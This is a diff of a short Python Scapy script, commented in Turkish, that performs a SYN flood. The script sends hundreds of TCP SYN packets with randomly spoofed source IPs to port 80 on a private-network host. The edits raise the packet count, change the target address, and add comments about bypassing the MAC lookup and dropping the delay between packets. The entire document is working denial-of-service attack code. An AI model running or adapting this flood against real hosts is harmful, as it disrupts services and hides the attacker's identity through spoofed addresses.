@@ -8,10 +8,10 @@ import time
 target_mac = "ff:ff:ff:ff:ff:ff" 
 
 print('Firtina basliyor...')
-for i in range(500):
+for i in range(850):
     # Ether katmanını ekleyerek MAC aramasını bypass ediyoruz
-    paket = Ether(dst=target_mac) / IP(src=RandIP(), dst='10.0.5.11') / TCP(dport=80, flags='S')
+    paket = Ether(dst=target_mac) / IP(src=RandIP(), dst='10.0.9.2') / TCP(dport=80, flags='S')
     sendp(paket, verbose=0) # sendp L2 katmanında gönderir
     # sleep'i kaldırıyoruz veya çok düşürüyoruz
     
-print('500 paket saniyeler içinde gönderildi!')
+print('Fırtına dindi!')
